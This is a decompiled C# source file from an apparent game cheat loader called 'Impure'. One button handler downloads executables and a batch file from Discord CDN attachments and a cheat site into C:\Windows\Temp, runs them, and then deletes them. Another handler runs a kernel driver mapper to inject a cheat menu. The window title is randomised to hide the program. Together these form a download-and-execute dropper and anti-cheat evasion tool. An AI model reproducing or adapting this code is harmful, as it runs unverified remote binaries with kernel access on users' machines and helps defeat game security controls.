﻿using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Markup;

namespace Impure
{
	// Token: 0x02000016 RID: 22
	public partial class Window1 : Window
	{
		// Token: 0x0600009D RID: 157 RVA: 0x000025E0 File Offset: 0x000007E0
		public Window1()
		{
			this.InitializeComponent();
			base.Title = Helpers.RandomString(Helpers.Rnd.Next(8, 32));
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00006098 File Offset: 0x00004298
		private void Button_Click(object sender, RoutedEventArgs e)
		{
			Directory.CreateDirectory("C:\\" + Helpers.RandomString(Helpers.Rnd.Next(8, 32)));
			Thread.Sleep(100);
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Temp\\wind64.exe";
			string path = "C:\\Windows\\Temp\\oKRNSQifOY.sys";
			string text2 = "C:\\Windows\\Temp\\ker.bat";
			string text3 = "C:\\Windows\\Temp\\driver.rar";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/743924598579396687/750489676447744169/wind64.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/743924598579396687/750489692935553065/ker.bat", text2);
			webClient.DownloadFile("https://naivecheats.com/driver.rar", text3);
			Thread.Sleep(1000);
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = false;
			process = Process.Start(text3);
			MessageBox.Show("Make Sure To Re-Name oKRNSQifOY.sys to pornhub.sys if you get errors");
			process.Start();
			process.WaitForExit();
			File.Delete(text);
			File.Delete(path);
			File.Delete(text2);
			File.Delete(text3);
			Thread.Sleep(600);
			MessageBox.Show("Finished Cleaning!");
			Thread.Sleep(1000);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000061CC File Offset: 0x000043CC
		private void Button_Click_1(object sender, RoutedEventArgs e)
		{
			MessageBox.Show("Make Sure You Are In A Server Before Injecting!");
			Cheatmenu cheatmenu = new Cheatmenu();
			cheatmenu.Show();
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\Temp\\Mapper.exe";
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = false;
			process = Process.Start(fileName);
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\Temp\\Mapper.exe");
			Thread.Sleep(600);
			Console.Write("Injected!");
			Thread.Sleep(1000);
		}
	}
}
